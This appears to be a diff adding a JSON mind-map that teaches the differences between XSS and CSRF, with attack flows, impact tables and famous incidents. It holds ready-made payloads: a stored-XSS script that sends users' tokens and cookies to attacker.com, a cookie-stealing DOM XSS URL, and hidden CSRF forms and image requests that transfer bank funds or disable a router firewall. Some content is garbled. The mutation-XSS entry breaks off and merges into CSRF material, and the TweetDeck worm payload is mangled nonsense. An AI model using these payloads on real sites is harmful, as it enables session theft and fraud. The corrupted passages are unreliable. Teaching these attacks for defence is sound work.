+              "markdown": "The attacker submits malicious input that gets stored in the application's database. When other users view the page containing the stored data, the script executes automatically.\n\n**Flow:** Attacker submits payload -> server stores it -> other users view page -> browser executes stored script\n\n**Realistic example - comment system:**\n\n```python\n# Vulnerable server code\n@app.route('/comment', methods=['POST'])\ndef post_comment():\n    comment = request.form.get('comment')\n    db.save_comment(comment)  # Stored as-is\n    return redirect('/post/123')\n\n@app.route('/post/<int:post_id>')\ndef view_post(post_id):\n    comments = db.get_comments(post_id)\n    html = '<div class=\"comments\">'\n    for comment in comments:\n        html += f'<div class=\"comment\">{comment.text}</div>'  # No encoding\n    html += '</div>'\n    return html\n```\n\n**Attack payload submitted as a comment:**\n\n```html\nGreat article! <script>\n(function() {\n    var xhr = new XMLHttpRequest();\n    xhr.open('GET', '/api/user/profile', true);\n    xhr.onload = function() {\n        var data = JSON.parse(this.responseText);\n        fetch('https://attacker.com/exfil', {\n            method: 'POST',\n            body: JSON.stringify({\n                email: data.email,\n                name: data.name,\n                token: data.api_token,\n                cookies: document.cookie\n            })\n        });\n    };\n    xhr.send();\n})();\n</script>\n```\n\nEvery user who views the post has their profile data and cookies exfiltrated.",
+              "notes": "The attacker submits malicious input that gets stored in the application's database. When other users view the page containing the stored data, the script executes automatically.\n\nFlow: Attacker submits payload -> server stores it -> other users view page -> browser executes stored script\n\nRealistic example - comment system:\n\nVulnerable server code\n@app.route('/comment', methods=['POST'])\ndef postcomment():\n    comment = request.form.get('comment')\n    db.savecomment(comment)  # Stored as-is\n    return redirect('/post/123')\n\n@app.route('/post/<int:postid>')\ndef viewpost(postid):\n    comments = db.getcomments(postid)\n    html = '<div class=\"comments\">'\n    for comment in comments:\n        html += f'<div class=\"comment\">{comment.text}</div>'  # No encoding\n    html += '</div>'\n    return html\n\nAttack payload submitted as a comment:\n\nGreat article! <script>\n(function() {\n    var xhr = new XMLHttpRequest();\n    xhr.open('GET', '/api/user/profile', true);\n    xhr.onload = function() {\n        var data = JSON.parse(this.responseText);\n        fetch('https://attacker.com/exfil', {\n            method: 'POST',\n            body: JSON.stringify({\n                email: data.email,\n                name: data.name,\n                token: data.apitoken,\n                cookies: document.cookie\n            })\n        });\n    };\n    xhr.send();\n})();\n</script>\n\nEvery user who views the post has their profile data and cookies exfiltrated.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "The attacker submits malicious input that gets stored in the application's...",
+              "expanded": false
+            },
+            {
+              "id": "n8f2963537f14d3c",
+              "title": "DOM-based XSS",
+              "markdown": "The vulnerability exists entirely in client-side JavaScript. The server never sees the malicious payload - it may be in the URL fragment (`#`), which browsers don't send to the server.\n\n**Flow:** Victim visits crafted URL -> client-side JS reads attacker-controlled input -> input used in dangerous sink -> script executes\n\n**Realistic example - client-side routing:**\n\n```javascript\n// Vulnerable client-side code\nconst page = location.hash.substring(1);\ndocument.getElementById('content').innerHTML = '<h1>Welcome to ' + page + '</h1>';\n```\n\n**Attack URL:**\n\n```\nhttps://vulnerable.com/#<img src=x onerror=\"fetch('https://attacker.com/steal?'+document.cookie)\">\n```\n\nThe fragment after `#` is never sent to the server, so server-side sanitization cannot catch this. The vulnerability is purely in the client-side `innerHTML` assignment.\n\n**Common DOM XSS sinks:**",
+              "notes": "The vulnerability exists entirely in client-side JavaScript. The server never sees the malicious payload - it may be in the URL fragment (#), which browsers don't send to the server.\n\nFlow: Victim visits crafted URL -> client-side JS reads attacker-controlled input -> input used in dangerous sink -> script executes\n\nRealistic example - client-side routing:\n\n// Vulnerable client-side code\nconst page = location.hash.substring(1);\ndocument.getElementById('content').innerHTML = '<h1>Welcome to ' + page + '</h1>';\n\nAttack URL:\n\nhttps://vulnerable.com/#<img src=x onerror=\"fetch('https://attacker.com/steal?'+document.cookie)\">\n\nThe fragment after # is never sent to the server, so server-side sanitization cannot catch this. The vulnerability is purely in the client-side innerHTML assignment.\n\nCommon DOM XSS sinks:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "n519e37934961799",
+                  "title": "element.innerHTML, element.outerHTML",
+                  "markdown": "- element.innerHTML, element.outerHTML",
+                  "notes": "element.innerHTML, element.outerHTML",
+                  "blurb": "element.innerHTML, element.outerHTML",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc129148a48fb3d3",
+                  "title": "document.write(), document.writeln()",
+                  "markdown": "- document.write(), document.writeln()",
+                  "notes": "document.write(), document.writeln()",
+                  "blurb": "document.write(), document.writeln()",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n03a2d108c018a41",
+                  "title": "eval(), setTimeout(string), setInterval(string)",
+                  "markdown": "- eval(), setTimeout(string), setInterval(string)",
+                  "notes": "eval(), setTimeout(string), setInterval(string)",
+                  "blurb": "eval(), setTimeout(string), setInterval(string)",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nd05c43b95813121",
+                  "title": "new Function(string)",
+                  "markdown": "- new Function(string)",
+                  "notes": "new Function(string)",
+                  "blurb": "new Function(string)",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n355ed262f96f4c5",
+                  "title": "element.setAttribute('onclick', ...)",
+                  "markdown": "- element.setAttribute('onclick', ...)",
+                  "notes": "element.setAttribute('onclick', ...)",
+                  "blurb": "element.setAttribute('onclick', ...)",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n20470af112b4a80",
+                  "title": "location.href, location.assign(), location.replace()",
+                  "markdown": "- location.href, location.assign(), location.replace()",
+                  "notes": "location.href, location.assign(), location.replace()",
+                  "blurb": "location.href, location.assign(), location.replace()",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nbf1a1a953a83dd7",
+                  "title": "location.hash, location.search, location.href",
+                  "markdown": "- location.hash, location.search, location.href",
+                  "notes": "location.hash, location.search, location.href",
+                  "blurb": "location.hash, location.search, location.href",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nf402f8b5ef2fc19",
+                  "title": "document.referrer",
+                  "markdown": "- document.referrer",
+                  "notes": "document.referrer",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n5a8e351eff5a359",
+                  "title": "window.name",
+                  "markdown": "- window.name",
+                  "notes": "window.name",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc38e2bbf0f24a14",
+                  "title": "postMessage data",
+                  "markdown": "- postMessage data",
+                  "notes": "postMessage data",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "The vulnerability exists entirely in client-side JavaScript.",
+              "expanded": false
+            },
+            {
+              "id": "ne9b994cead6fb0c",
+              "title": "Mutation XSS (mXSS)",
+              "markdown": "Exploits differences between how an HTML sanitizer parses markup and how the browser ultimately renders it. The sanitizer sees safe HTML; the browser's parser mutates it into something executable.\n\n**Example:**\n\n```html\n\n<p id=\"test\"><math><mi><table><mglyph><style>\n\n<h1>Cute cat pictures!</h1>\n<img src=\"https://admin.router.local/api/dns?server=8.8.8.8\" width=\"0\" height=\"0\">\n<img src=\"https://admin.router.local/api/firewall?action=disable\" width=\"0\" height=\"0\">\n```\n\nWhen the victim (who is logged into their router admin panel) visits this page, the browser sends authenticated GET requests that change DNS settings and disable the firewall.\n\n**Why GET-based CSRF is especially dangerous:** Many developers implement state-changing operations as GET requests (violating HTTP semantics), and GET requests can be triggered by `<img>`, `<script>`, `<link>`, CSS `url()`, and many other HTML elements without any JavaScript.",
+              "notes": "Exploits differences between how an HTML sanitizer parses markup and how the browser ultimately renders it. The sanitizer sees safe HTML; the browser's parser mutates it into something executable.\n\nExample:\n\n<p id=\"test\"><math><mi><table><mglyph><style>\n\n<h1>Cute cat pictures!</h1>\n<img src=\"https://admin.router.local/api/dns?server=8.8.8.8\" width=\"0\" height=\"0\">\n<img src=\"https://admin.router.local/api/firewall?action=disable\" width=\"0\" height=\"0\">\n\nWhen the victim (who is logged into their router admin panel) visits this page, the browser sends authenticated GET requests that change DNS settings and disable the firewall.\n\nWhy GET-based CSRF is especially dangerous: Many developers implement state-changing operations as GET requests (violating HTTP semantics), and GET requests can be triggered by <img>, <script>, <link>, CSS url(), and many other HTML elements without any JavaScript.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "Exploits differences between how an HTML sanitizer parses markup and how the...",
+              "expanded": false
+            },
+            {
+              "id": "na4f7caeb76d2eff",
+              "title": "POST-based CSRF",
+              "markdown": "Uses an auto-submitting HTML form.\n\n**Flow:** Victim visits attacker's page -> hidden form auto-submits -> browser sends authenticated POST request with attacker's parameters\n\n**Realistic example - bank transfer:**\n\n```html\n\n<html>\n<body onload=\"document.getElementById('csrf-form').submit();\">\n  <h1>Congratulations! You've won a prize!</h1>\n  <form id=\"csrf-form\" action=\"https://bank.com/transfer\" method=\"POST\" style=\"display:none;\">\n    <input type=\"hidden\" name=\"to_account\" value=\"ATTACKER-IBAN-12345\" />\n    <input type=\"hidden\" name=\"amount\" value=\"5000\" />\n    <input type=\"hidden\" name=\"currency\" value=\"USD\" />\n  </form>\n</body>\n</html>\n```\n\nThe form auto-submits on page load. The victim's browser includes the bank's session cookie. The bank's server sees a valid authenticated POST request and processes the transfer.",
+              "notes": "Uses an auto-submitting HTML form.\n\nFlow: Victim visits attacker's page -> hidden form auto-submits -> browser sends authenticated POST request with attacker's parameters\n\nRealistic example - bank transfer:\n\n<html>\n<body onload=\"document.getElementById('csrf-form').submit();\">\n  <h1>Congratulations! You've won a prize!</h1>\n  <form id=\"csrf-form\" action=\"https://bank.com/transfer\" method=\"POST\" style=\"display:none;\">\n    <input type=\"hidden\" name=\"toaccount\" value=\"ATTACKER-IBAN-12345\" />\n    <input type=\"hidden\" name=\"amount\" value=\"5000\" />\n    <input type=\"hidden\" name=\"currency\" value=\"USD\" />\n  </form>\n</body>\n</html>\n\nThe form auto-submits on page load. The victim's browser includes the bank's session cookie. The bank's server sees a valid authenticated POST request and processes the transfer.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "Uses an auto-submitting HTML form.",
+              "expanded": false
+            },
+            {
+              "id": "n7bf55904b0653ff",
+              "title": "Login CSRF",
+              "markdown": "An often-overlooked variant: the attacker forces the victim to log into the *attacker's* account.\n\n**Flow:** Attacker creates form that logs victim into attacker's account -> victim performs actions believing they're in their own account -> attacker later reviews account activity\n\n**Realistic example:**\n\n```html\n\n<form action=\"https://cloud-storage.com/login\" method=\"POST\">\n  <input type=\"hidden\" name=\"username\" value=\"attacker@evil.com\" />\n  <input type=\"hidden\" name=\"password\" value=\"attacker-password\" />\n</form>\n<script>document.forms[0].submit();</script>\n```\n\n**Why it matters:** If the victim uploads sensitive files while unknowingly logged into the attacker's account, the attacker gains access to those files. Google once had this vulnerability - attackers could force victims to log into the attacker's Google account and capture their search history.",
+              "notes": "An often-overlooked variant: the attacker forces the victim to log into the attacker's account.\n\nFlow: Attacker creates form that logs victim into attacker's account -> victim performs actions believing they're in their own account -> attacker later reviews account activity\n\nRealistic example:\n\n<form action=\"https://cloud-storage.com/login\" method=\"POST\">\n  <input type=\"hidden\" name=\"username\" value=\"attacker@evil.com\" />\n  <input type=\"hidden\" name=\"password\" value=\"attacker-password\" />\n</form>\n<script>document.forms[0].submit();</script>\n\nWhy it matters: If the victim uploads sensitive files while unknowingly logged into the attacker's account, the attacker gains access to those files. Google once had this vulnerability - attackers could force victims to log into the attacker's Google account and capture their search history.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "An often-overlooked variant: the attacker forces the victim to log into the...",
+              "expanded": false
+            },
+            {
+              "id": "n26d51fd22ebcf99",
+              "title": "JSON-based CSRF",
+              "markdown": "Modern APIs often expect JSON payloads. Attackers can sometimes send JSON via form submissions or exploit CORS misconfigurations.\n\n**Realistic example - exploiting lenient content-type handling:**\n\n```html\n\n<form action=\"https://api.target.com/user/settings\" method=\"POST\"\n      enctype=\"text/plain\">\n  <input name='{\"email\":\"attacker@evil.com\",\"ignore\":\"' value='\"}' />\n</form>\n<script>document.forms[0].submit();</script>\n```\n\nThis sends a request body of: `{\"email\":\"attacker@evil.com\",\"ignore\":\"=\"}` - which is valid JSON if the server doesn't strictly validate Content-Type.\n\n**Attempt 2 - using `fetch` with `no-cors` mode:**\n\n```javascript\n// This will send the request but cannot read the response\n// However, the Content-Type will be limited to form types\nfetch('https://api.target.com/user/settings', {\n    method: 'POST',\n    mode: 'no-cors',\n    headers: { 'Content-Type': 'text/plain' },\n    body: JSON.stringify({ email: 'attacker@evil.com' }),\n    credentials: 'include'\n});\n```\n\n**Defenses against JSON CSRF:**",
+              "notes": "Modern APIs often expect JSON payloads. Attackers can sometimes send JSON via form submissions or exploit CORS misconfigurations.\n\nRealistic example - exploiting lenient content-type handling:\n\n<form action=\"https://api.target.com/user/settings\" method=\"POST\"\n      enctype=\"text/plain\">\n  <input name='{\"email\":\"attacker@evil.com\",\"ignore\":\"' value='\"}' />\n</form>\n<script>document.forms[0].submit();</script>\n\nThis sends a request body of: {\"email\":\"attacker@evil.com\",\"ignore\":\"=\"} - which is valid JSON if the server doesn't strictly validate Content-Type.\n\nAttempt 2 - using fetch with no-cors mode:\n\n// This will send the request but cannot read the response\n// However, the Content-Type will be limited to form types\nfetch('https://api.target.com/user/settings', {\n    method: 'POST',\n    mode: 'no-cors',\n    headers: { 'Content-Type': 'text/plain' },\n    body: JSON.stringify({ email: 'attacker@evil.com' }),\n    credentials: 'include'\n});\n\nDefenses against JSON CSRF:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "ncb7385e5b8fedb2",
+                  "title": "Strictly validate Content-Type: application/json (forms can't set this header cross-orig",
+                  "markdown": "- Strictly validate Content-Type: application/json (forms can't set this header cross-orig",
+                  "notes": "Strictly validate Content-Type: application/json (forms can't set this header cross-orig",
+                  "blurb": "Strictly validate Content-Type: application/json (forms can't set this...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n158d07454124dba",
+                  "title": "Require a custom header (e.g., X-Requested-With) - custom headers trigger CORS preflight",
+                  "markdown": "- Require a custom header (e.g., X-Requested-With) - custom headers trigger CORS preflight",
+                  "notes": "Require a custom header (e.g., X-Requested-With) - custom headers trigger CORS preflight",
+                  "blurb": "Require a custom header (e.g., X-Requested-With) - custom headers trigger...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n966e2fb6d0c19f9",
+                  "title": "Standard CSRF tokens in a custom header",
+                  "markdown": "- Standard CSRF tokens in a custom header",
+                  "notes": "Standard CSRF tokens in a custom header",
+                  "blurb": "Standard CSRF tokens in a custom header",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Modern APIs often expect JSON payloads.",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Reflected XSS",
+          "expanded": false
+        },
+        {
+          "id": "n37ad666787d97fa",
+          "title": "Combined Attack: XSS Enabling CSRF Bypass",
+          "markdown": "This is perhaps the most critical insight in this entire comparison: **XSS on the same origin completely defeats CSRF protections**.\n\n**Why this happens:**\n\nWhen an attacker has XSS in the target application, the malicious script runs *within* the application's origin. This means:",
+          "notes": "This is perhaps the most critical insight in this entire comparison: XSS on the same origin completely defeats CSRF protections.\n\nWhy this happens:\n\nWhen an attacker has XSS in the target application, the malicious script runs within the application's origin. This means:",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "n6765dbb3243c979",
+              "title": "It can read CSRF tokens from hidden form fields, meta tags, or API responses",
+              "markdown": "- It can read CSRF tokens from hidden form fields, meta tags, or API responses",
+              "notes": "It can read CSRF tokens from hidden form fields, meta tags, or API responses",
+              "blurb": "It can read CSRF tokens from hidden form fields, meta tags, or API responses",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nd3e246a45df4130",
+              "title": "It can craft requests with all necessary headers including custom headers like X-Request",
+              "markdown": "- It can craft requests with all necessary headers including custom headers like X-Request",
+              "notes": "It can craft requests with all necessary headers including custom headers like X-Request",
+              "blurb": "It can craft requests with all necessary headers including custom headers...",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n818ee10e644a312",
+              "title": "It operates within the same origin, so SameSite cookies are included normally",
+              "markdown": "- It operates within the same origin, so SameSite cookies are included normally",
+              "notes": "It operates within the same origin, so SameSite cookies are included normally",
+              "blurb": "It operates within the same origin, so SameSite cookies are included normally",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n8c9bddefb3ce1de",
+              "title": "It can read responses, unlike traditional CSRF, making the attack bidirectional",
+              "markdown": "- It can read responses, unlike traditional CSRF, making the attack bidirectional",
+              "notes": "It can read responses, unlike traditional CSRF, making the attack bidirectional",
+              "blurb": "It can read responses, unlike traditional CSRF, making the attack...",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n6b77ad00f9a1c52",
+              "title": "CORS restrictions don't apply because the request originates from the same origin",
+              "markdown": "- CORS restrictions don't apply because the request originates from the same origin",
+              "notes": "CORS restrictions don't apply because the request originates from the same origin",
+              "blurb": "CORS restrictions don't apply because the request originates from the same...",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "This is perhaps the most critical insight in this entire comparison: XSS on...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes XSS Attack Flow",
+      "expanded": true
+    },
+    {
+      "id": "n7b34d10801ec8b5",
+      "title": "Impact Comparison",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n69ff603cc60e2ba",
+          "title": "XSS Impact Severity",
+          "markdown": "XSS is considered one of the most versatile web vulnerabilities because the attacker gains JavaScript execution in the victim's browser:\n\n| Impact Category | Description | Severity |\n|----------------|-------------|----------|\n| **Session hijacking** | Steal session cookies/tokens (if not HttpOnly) and impersonate the user | Critical |\n| **Credential theft** | Inject fake login forms, deploy keyloggers | Critical |\n| **Data exfiltration** | Read sensitive page content, API responses, localStorage | Critical |\n| **Account takeover** | Change email/password, add attacker's MFA device | Critical |\n| **Malware distribution** | Redirect users to exploit kits or malware downloads | High |\n| **Cryptocurrency mining** | Inject mining scripts that use victim's CPU | Medium |\n| **Defacement** | Modify page content to display attacker's message | Medium |\n| **Phishing** | Display convincing phishing content within the trusted domain | High |\n| **Worm propagation** | Self-replicating XSS that spreads across users | Critical |\n| **Keylogging** | Capture all keystrokes on the page | Critical |\n| **Webcam/mic access** | Trigger permission prompts from trusted origin | High |\n| **Network scanning** | Probe internal network via victim's browser | High |",
+          "notes": "XSS is considered one of the most versatile web vulnerabilities because the attacker gains JavaScript execution in the victim's browser:\n\n| Impact Category | Description | Severity |\n|----------------|-------------|----------|\n| Session hijacking | Steal session cookies/tokens (if not HttpOnly) and impersonate the user | Critical |\n| Credential theft | Inject fake login forms, deploy keyloggers | Critical |\n| Data exfiltration | Read sensitive page content, API responses, localStorage | Critical |\n| Account takeover | Change email/password, add attacker's MFA device | Critical |\n| Malware distribution | Redirect users to exploit kits or malware downloads | High |\n| Cryptocurrency mining | Inject mining scripts that use victim's CPU | Medium |\n| Defacement | Modify page content to display attacker's message | Medium |\n| Phishing | Display convincing phishing content within the trusted domain | High |\n| Worm propagation | Self-replicating XSS that spreads across users | Critical |\n| Keylogging | Capture all keystrokes on the page | Critical |\n| Webcam/mic access | Trigger permission prompts from trusted origin | High |\n| Network scanning | Probe internal network via victim's browser | High |",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "XSS is considered one of the most versatile web vulnerabilities because the...",
+          "expanded": false
+        },
+        {
+          "id": "n5fe2769f7d072b1",
+          "title": "CSRF Impact Severity",
+          "markdown": "CSRF impact depends entirely on what state-changing actions the target application exposes:\n\n| Impact Category | Description | Severity |\n|----------------|-------------|----------|\n| **Unauthorized transactions** | Fund transfers, purchases, payments | Critical |\n| **Account takeover** | Change email -> password reset -> full takeover | Critical |\n| **Privilege escalation** | Create admin accounts, grant elevated roles | Critical |\n| **Data modification** | Change settings, delete records, modify profiles | High |\n| **Social engineering** | Post content as victim, send messages | Medium |\n| **Configuration changes** | Modify security settings, disable protections | High |\n\n**Key limitation:** CSRF **cannot directly steal data**. It is a blind, write-only attack. The attacker can force actions but cannot observe their results.",
+          "notes": "CSRF impact depends entirely on what state-changing actions the target application exposes:\n\n| Impact Category | Description | Severity |\n|----------------|-------------|----------|\n| Unauthorized transactions | Fund transfers, purchases, payments | Critical |\n| Account takeover | Change email -> password reset -> full takeover | Critical |\n| Privilege escalation | Create admin accounts, grant elevated roles | Critical |\n| Data modification | Change settings, delete records, modify profiles | High |\n| Social engineering | Post content as victim, send messages | Medium |\n| Configuration changes | Modify security settings, disable protections | High |\n\nKey limitation: CSRF cannot directly steal data. It is a blind, write-only attack. The attacker can force actions but cannot observe their results.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "CSRF impact depends entirely on what state-changing actions the target...",
+          "expanded": false
+        },
+        {
+          "id": "n67802895edde3fe",
+          "title": "Risk Rating Comparison",
+          "markdown": "| Metric | XSS | CSRF |\n|--------|-----|------|\n| **CWE** | CWE-79 | CWE-352 |\n| **Typical CVSS** | 6.1-9.6 (varies by type and context) | 4.3-8.8 (depends on action impacted) |\n| **OWASP Top 10** | A03:2021 Injection | A01:2021 Broken Access Control |\n| **General severity ranking** | Higher (versatile, data exfil possible) | Lower (blind, action-only) |\n| **Stored XSS vs CSRF** | Stored XSS is almost always rated Critical | CSRF on admin actions can be Critical |\n\n**Nuance:** A CSRF on a wire transfer endpoint at a bank is more impactful than a reflected XSS on a static marketing page. Context always matters. But *given equivalent attack surfaces*, XSS is rated higher because it is more versatile and subsumes CSRF capability.",
+          "notes": "| Metric | XSS | CSRF |\n|--------|-----|------|\n| CWE | CWE-79 | CWE-352 |\n| Typical CVSS | 6.1-9.6 (varies by type and context) | 4.3-8.8 (depends on action impacted) |\n| OWASP Top 10 | A03:2021 Injection | A01:2021 Broken Access Control |\n| General severity ranking | Higher (versatile, data exfil possible) | Lower (blind, action-only) |\n| Stored XSS vs CSRF | Stored XSS is almost always rated Critical | CSRF on admin actions can be Critical |\n\nNuance: A CSRF on a wire transfer endpoint at a bank is more impactful than a reflected XSS on a static marketing page. Context always matters. But given equivalent attack surfaces, XSS is rated higher because it is more versatile and subsumes CSRF capability.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "| Metric | XSS | CSRF | |--------|-----|------| | CWE | CWE-79 | CWE-352 | |...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes XSS Impact Severity",
+      "expanded": true
+    },
+    {
+      "id": "ndb8dc6e79b0d697",
+      "title": "Real-World Examples",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "ne29528e1bb8b6dd",
+          "title": "Famous XSS Attacks",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "n0f908917c7b5678",
+              "title": "Samy Worm (MySpace, 2005)",
+              "markdown": "The first self-propagating XSS worm. Samy Kamkar exploited a stored XSS vulnerability in MySpace profiles. The worm:",
+              "notes": "The first self-propagating XSS worm. Samy Kamkar exploited a stored XSS vulnerability in MySpace profiles. The worm:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "nb29ab56b6afdf12",
+                  "title": "Added Samy as a friend to every infected user's profile",
+                  "markdown": "- Added Samy as a friend to every infected user's profile",
+                  "notes": "Added Samy as a friend to every infected user's profile",
+                  "blurb": "Added Samy as a friend to every infected user's profile",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc5b5e7d65464ffd",
+                  "title": "Added \"but most of all, samy is my hero\" to their profile",
+                  "markdown": "- Added \"but most of all, samy is my hero\" to their profile",
+                  "notes": "Added \"but most of all, samy is my hero\" to their profile",
+                  "blurb": "Added \"but most of all, samy is my hero\" to their profile",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n3740388ceadf297",
+                  "title": "Copied itself to the victim's profile, infecting anyone who viewed it",
+                  "markdown": "- Copied itself to the victim's profile, infecting anyone who viewed it",
+                  "notes": "Copied itself to the victim's profile, infecting anyone who viewed it",
+                  "blurb": "Copied itself to the victim's profile, infecting anyone who viewed it",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n7d40f2105e5b3fd",
+                  "title": "Infected over 1 million users in under 20 hours",
+                  "markdown": "- Infected over 1 million users in under 20 hours",
+                  "notes": "Infected over 1 million users in under 20 hours",
+                  "blurb": "Infected over 1 million users in under 20 hours",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "The first self-propagating XSS worm.",
+              "expanded": false
+            },
+            {
+              "id": "ndc7d24d6d8ae1b6",
+              "title": "British Airways / Magecart (2018)",
+              "markdown": "Attackers compromised British Airways' website and mobile app by injecting a malicious script (22 lines of JavaScript) that:",
+              "notes": "Attackers compromised British Airways' website and mobile app by injecting a malicious script (22 lines of JavaScript) that:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "n8cd12dcd2c1b1cd",
+                  "title": "Captured payment card details as customers entered them",
+                  "markdown": "- Captured payment card details as customers entered them",
+                  "notes": "Captured payment card details as customers entered them",
+                  "blurb": "Captured payment card details as customers entered them",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n24f79ae3f94da68",
+                  "title": "Exfiltrated data to a lookalike domain (baways.com)",
+                  "markdown": "- Exfiltrated data to a lookalike domain (baways.com)",
+                  "notes": "Exfiltrated data to a lookalike domain (baways.com)",
+                  "blurb": "Exfiltrated data to a lookalike domain (baways.com)",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "na960558cd520c82",
+                  "title": "Ran undetected for approximately 15 days",
+                  "markdown": "- Ran undetected for approximately 15 days",
+                  "notes": "Ran undetected for approximately 15 days",
+                  "blurb": "Ran undetected for approximately 15 days",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nb7ee0827c65fd7e",
+                  "title": "Affected ~380,000 transactions",
+                  "markdown": "- Affected ~380,000 transactions",
+                  "notes": "Affected ~380,000 transactions",
+                  "blurb": "Affected ~380,000 transactions",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Attackers compromised British Airways' website and mobile app by injecting a...",
+              "expanded": false
+            },
+            {
+              "id": "nb6fb0e99870f481",
+              "title": "TweetDeck Worm (2014)",
+              "markdown": "A stored XSS vulnerability in TweetDeck allowed a self-retweeting worm. The payload was embedded in a tweet:\n\n```\n<script class=\"xss\">$('.telerik-reSt498').telerik-reStContent\n.telerik-reStRepl498 document.write('');\n</script>\u271e\n```\n\nThe worm caused approximately 80,000 users to unknowingly retweet the malicious tweet.",
+              "notes": "A stored XSS vulnerability in TweetDeck allowed a self-retweeting worm. The payload was embedded in a tweet:\n\n<script class=\"xss\">$('.telerik-reSt498').telerik-reStContent\n.telerik-reStRepl498 document.write('');\n</script>\u271e\n\nThe worm caused approximately 80,000 users to unknowingly retweet the malicious tweet.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "A stored XSS vulnerability in TweetDeck allowed a self-retweeting worm.",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Samy Worm (MySpace, 2005)",
+          "expanded": false
+        },
+        {
+          "id": "n2dea22ffa58968e",
+          "title": "Famous CSRF Attacks",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "n71727d21f5737f9",
+              "title": "Gmail Email Filter Attack (2007)",
+              "markdown": "A CSRF vulnerability in Gmail allowed attackers to create email forwarding filters in the victim's account:",
+              "notes": "A CSRF vulnerability in Gmail allowed attackers to create email forwarding filters in the victim's account:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "nb8583aaee7c4e5a",
+                  "title": "The victim visited a malicious page while logged into Gmail",
+                  "markdown": "- The victim visited a malicious page while logged into Gmail",
+                  "notes": "The victim visited a malicious page while logged into Gmail",
+                  "blurb": "The victim visited a malicious page while logged into Gmail",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n9459e5b2e0e8874",
+                  "title": "The page submitted a forged POST request to Gmail's filter creation endpoint",
+                  "markdown": "- The page submitted a forged POST request to Gmail's filter creation endpoint",
+                  "notes": "The page submitted a forged POST request to Gmail's filter creation endpoint",
+                  "blurb": "The page submitted a forged POST request to Gmail's filter creation endpoint",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
